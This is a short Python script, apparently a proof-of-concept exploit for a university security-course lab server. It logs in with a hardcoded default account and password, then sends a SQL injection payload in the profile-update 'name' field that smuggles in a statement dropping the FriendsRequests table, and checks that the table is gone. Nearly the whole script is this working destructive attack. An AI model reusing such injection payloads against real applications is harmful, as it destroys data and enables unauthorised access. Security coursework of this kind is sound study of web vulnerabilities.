import requests 

Server = 'http://a40ff75cdce02380039a825884964b5e117af09561845c13679abcb87fe4.project.ssof.rnl.tecnico.ulisboa.pt'
session = requests.session()

#Default account
user = "investor"
password = "benfica123"

#Login
params = {'username' : user, 'password' : password }
r = session.post(Server + '/login', data=params)

headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}
params = {}
r = requests.get(Server + '/profile', params=params, headers=headers, cookies = session.cookies)

#Update Profile with injection
files = {'photo': '(binary)'}

params = {'name': "' where username = 'test'; drop table FriendsRequests; -- ", 'currentpassword': password, 'newpassword': password, 'about': ""  }
r = session.post(Server + '/update_profile', files = files , data = params, cookies = session.cookies)


params = {}
r = requests.get(Server + '/pending_requests', params=params, headers=headers, cookies = session.cookies)

assert "error" in r.text
print('Table was dropped')